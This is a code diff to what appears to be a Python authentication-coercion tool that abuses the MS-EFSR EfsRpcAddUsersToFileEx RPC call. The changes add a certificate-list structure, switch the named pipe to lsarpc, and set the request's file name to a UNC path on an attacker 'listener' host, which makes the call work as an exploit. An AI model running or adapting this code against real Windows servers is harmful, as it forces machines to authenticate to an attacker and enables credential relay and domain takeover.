@@ -29,13 +29,19 @@ class DCERPCSessionError(DCERPCException):
             return 'SessionError: unknown error code: 0x%x' % self.error_code
 
 
+class ENCRYPTION_CERTIFICATE_LIST(NDRSTRUCT):
+    align = 1
+    structure = (
+        ('Data', ':'),
+    )
+
 class EfsRpcAddUsersToFileEx(NDRCALL):
     opnum = 15
     structure = (
         ('dwFlags', DWORD), # Type: DWORD
         ('Reserved', DWORD), # Type: EFS_RPC_BLOB *
         ('FileName', WSTR), # Type: wchar_t *
-        ('EncryptionCertificates', ENCRYPTION_CERTIFICATE_LIST *), # Type: ENCRYPTION_CERTIFICATE_LIST *
+        ('EncryptionCertificates', ENCRYPTION_CERTIFICATE_LIST), # Type: ENCRYPTION_CERTIFICATE_LIST *
     )
 
 
@@ -109,17 +115,17 @@ class RPCProtocol(object):
 class MS_EFSR(RPCProtocol):
     uuid = "c681d488-d850-11d0-8c52-00c04fd90f7e"
     version = "1.0"
-    pipe = r"\pipe\efsrpc"
+    pipe = r"\pipe\lsarpc"
 
     def EfsRpcAddUsersToFileEx(self, listener):
         if self.dce is not None:
             print("[>] Calling EfsRpcAddUsersToFileEx() ...")
             try:
                 request = EfsRpcAddUsersToFileEx()
+                request['FileName'] = '\\\\%s\\share\\file.txt\x00' % listener
                 request['dwFlags'] = 0
                 request['Reserved'] = 0
-                request['FileName'] = '\\\\%s\\share\\file.txt\x00' % listener
-                request['EncryptionCertificates'] = 0
+                request['EncryptionCertificates'] = ENCRYPTION_CERTIFICATE_LIST()
                 # request.dump()
                 resp = self.dce.request(request)
             except Exception as e:
